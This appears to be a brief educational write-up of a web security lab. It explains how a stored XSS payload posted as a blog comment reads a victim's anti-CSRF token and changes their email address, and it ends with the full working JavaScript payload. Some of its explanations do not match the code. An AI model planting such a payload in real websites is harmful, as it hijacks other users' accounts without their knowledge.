*This information is only for the purposes of education and skills development. GET and POST are not acronyms.*

**Objective**
Change another user's email address.

**XSS**
- In Cross Site Scripting or *code injection*, malicious JavaScript payload is injected across different code sites within the same website. 
- As the attack targets the user's browser session, it is client side instead of server side.

**Point of Entry**
- Prospective victim looks at all blogpost comments.
- Blogpost comment function is point of entry to exfiltrate admin username and password.

**Barrier to entry** 
- Anti CSRF token for CSRF protection - *csrf* in requests and responses.

**Bypassing Barrier to Entry**
- Post email address change exploit script in template as comment on a chosen blogpost. 
- On opening the chosen blogpost the exploit is triggered. The unsuspecting user's csrf is copied from POST request to open blogpost page.
- Momentarily, copied csrf is used in POST request to change user's email address. 

**Template**
`<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>`